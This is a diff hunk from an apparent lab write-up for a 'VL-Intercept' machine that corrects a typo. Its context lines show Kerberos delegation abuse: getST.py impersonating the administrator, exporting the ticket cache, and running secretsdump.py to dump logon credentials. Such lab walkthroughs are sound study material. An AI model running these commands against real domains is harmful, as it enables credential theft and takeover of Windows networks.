@@ -103,7 +103,7 @@ getST.py -spn cifs/WS01.intercept.vl -dc-ip 10.10.185.69 -impersonate administra
 ```
 ![_install](/assets/img/VL-Intercept/TGT.png)
 
-Now we export the TGT in memory and run secretsdump.py to obtains logon information.
+Now we export the TGT in memory and run secretsdump.py to obtain logon information.
 ```bash
 export KRB5CCNAME=administrator@cifs_WS01.intercept.vl@INTERCEPT.VL.ccache 
 secretsdump.py administrator@WS01.intercept.vl -k -no-pass
